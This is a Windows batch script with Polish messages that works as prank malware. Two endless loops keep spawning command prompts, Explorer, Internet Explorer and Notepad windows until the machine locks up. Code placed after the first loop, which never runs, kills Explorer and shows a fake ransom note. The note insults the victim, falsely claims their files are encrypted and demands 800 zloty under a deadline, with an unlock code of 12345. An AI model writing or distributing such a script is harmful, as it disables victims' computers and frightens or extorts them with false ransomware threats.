@echo off
color 4
title %random%
:cocomo
@echo %random%
start cmd
start explorer
start iexplore
start notepad
goto cocomo
taskkill /f /im explorer.exe
cls
echo Siemka debilu glupi! Twe pliki i ich dane zostaly zaszyfrowane z twym pc zeby je dostac musisz kupic kod
echo Zaplac 800zl czasu masz 3dzni 5godz 54min 39sek jak czas minie twe pc zostanie zablokowane na zawsze:( 
echo Dawaj plac jak:)
echo Obiecuje ze dotrzymam slowa dostaniesz pc:)
set code=""

:code
set /p code="Wpisz kod:"
if "%code%"=="12345" goto correct
if NOT "%code%"=="12345" goto wrong

:correct
start explorer
echo Kod jest dobry masz pc dla siebie:)
pause
exit

:wrong
echo Kod nieprawidlowy chyba nie zaplaciles:(
goto code
@echo off
title explorer

:start
start notepad.exe
start cmd.exe
goto :start
